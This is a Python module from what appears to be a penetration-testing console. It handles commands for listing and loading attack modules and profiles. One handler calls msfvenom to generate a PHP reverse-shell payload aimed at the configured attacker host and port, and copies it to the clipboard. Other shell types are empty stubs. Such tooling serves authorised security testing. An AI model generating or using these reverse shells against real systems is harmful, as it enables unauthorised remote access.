from . import commons
import sys,os,re,json
import clipboard

from ..miscellaneous.config import Config,bcolors
from .module import switcher_module

shellz_notes = ["Spawn TTY shell https://netsec.ws/?p=337"]

def external_shellz(cmd=None,state=None):
    out = ""
    if cmd[0] == "linux_x86":
        clipboard.copy(out)
        print("{}* linux_x86 copied to clipboard{}".format(bcolors.WARNING,bcolors.ENDC))
        return
    elif cmd[0] == "windows_x86":
        clipboard.copy(out)
        print("{}* windows_x86 copied to clipboard{}".format(bcolors.WARNING,bcolors.ENDC))
        return
    elif cmd[0] == "php":
        out = os.popen("msfvenom -p php/reverse_php LHOST="+Config.HOSTIP+" LPORT="+Config.SHELLPORT+" -f raw").read()
    elif cmd[0] == "asp":
        return
    elif cmd[0] == "jsp":
        return
    elif cmd[0] == "notes":
        for note in shellz_notes:
            print("{}[*] {}{}".format(bcolors.OKBLUE,note,bcolors.ENDC))
        return
    else:
        print("{}Invalid option!{}".format(bcolors.WARNING,bcolors.ENDC))
        return
    clipboard.copy(out)
    print("{}* Shell {} copied to clipboard{}".format(bcolors.WARNING,cmd[0],bcolors.ENDC))
    return

def external_use(cmd=None,state=None):
    if len(cmd)==2:
        if bool(re.match(r"^modules\/.+",cmd[1])):
            
            if os.path.isfile(Config.PATH + "/src/" + cmd[1] + ".py"):
                state.module_state = cmd[1]
                state.module_class = switcher_module.get(state.module_state,None)
            else:
                print("{}Module not found!{}".format(bcolors.WARNING,bcolors.ENDC))
        elif bool(re.match(r"^profiles\/.+",cmd[1])):
            if os.path.isfile(Config.PATH + "/src/" + cmd[1] + ".tpl"):
                try:
                    tpl = json.load(open(Config.PATH+"/src/"+cmd[1]+".tpl"))
                except Exception as e:
                    print("{}File does not contain valid JSON!{}".format(bcolors.WARNING,bcolors.ENDC))
                else:
                    try:
                        if Profiler.validate(tpl):
                            Profiler(tpl).start()
                        else:
                            print("{}File .tpl not in expected format!{}".format(bcolors.WARNING,bcolors.ENDC))
                    except Exception as e:
                        print("{}".format(e))
                        print("{}".format(traceback.print_exc()))
            else:
                print("{}Profile not found!{}".format(bcolors.WARNING,bcolors.ENDC))
        else:
            print("{}Invalid Module/Profile!{}".format(bcolors.WARNING,bcolors.ENDC))


    else:
        print("{}Usage: use <Module||Profile>{}".format(bcolors.WARNING,bcolors.ENDC))


def external_search_aux(root,opt,state=None):

    if root == "modules":
        ext = "\.py"
        ext_cut = -3
    else:
        ext = "\.tpl"
        ext_cut = -4

    for r, d, f in os.walk(Config.PATH + "/src/"+root):
        for file in f:
            if bool(re.match(r"^[a-zA-Z0-9]+"+ext+"$",file)) and (file[:ext_cut] not in ["monitor","module","profiler","portscanner"]):
                path = r.split("src")[1][1:]
                split_path = path.split("/")
                split_path.append(file[:ext_cut])
                if opt != None and opt in split_path:
                    print("{}[*] {}{}{}/{}".format(bcolors.OKBLUE,bcolors.ENDC,bcolors.BOLD,path,file[:ext_cut]))
                elif opt == None:
                    print("{}[*] {}{}{}/{}".format(bcolors.OKBLUE,bcolors.ENDC,bcolors.BOLD,path,file[:ext_cut]))

def external_search(cmd=None,state=None):
    if len(cmd) == 1:
        external_search_aux("modules",None)
        external_search_aux("profiles",None)
    elif len(cmd) == 2:
        external_search_aux("modules",cmd[1])
        external_search_aux("profiles",cmd[1])
    else:
        print("{}Usage: list <module||profile||empty>{}".format(bcolors.WARNING,bcolors.ENDC))
    return
